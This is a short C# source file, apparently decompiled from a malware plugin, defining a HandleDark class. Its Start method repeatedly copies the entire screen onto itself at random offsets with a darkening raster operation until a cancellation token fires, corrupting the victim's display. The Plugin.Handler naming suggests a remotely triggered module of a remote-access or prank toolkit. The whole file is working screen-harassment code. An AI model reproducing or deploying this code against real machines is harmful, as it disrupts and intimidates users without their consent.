using System;
using System.Threading;
using System.Windows.Forms;
using Plugin.Helper.GDI;

namespace Plugin.Handler.GDI;

internal class HandleDark
{
	public static CancellationTokenSource ctsStop;

	public static void Start()
	{
		if (ctsStop == null || ctsStop.IsCancellationRequested)
		{
			ctsStop = new CancellationTokenSource();
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Random random = new Random();
			while (!ctsStop.IsCancellationRequested)
			{
				IntPtr dC = NativeMethods.GetDC(IntPtr.Zero);
				NativeMethods.BitBlt(dC, random.Next(2), random.Next(2), width, height, dC, random.Next(2), random.Next(2), 2229030u);
				Thread.Sleep(300);
				NativeMethods.ReleaseDC(IntPtr.Zero, dC);
			}
		}
	}

	public static void Stop()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			ctsStop.Cancel();
		}
	}
}
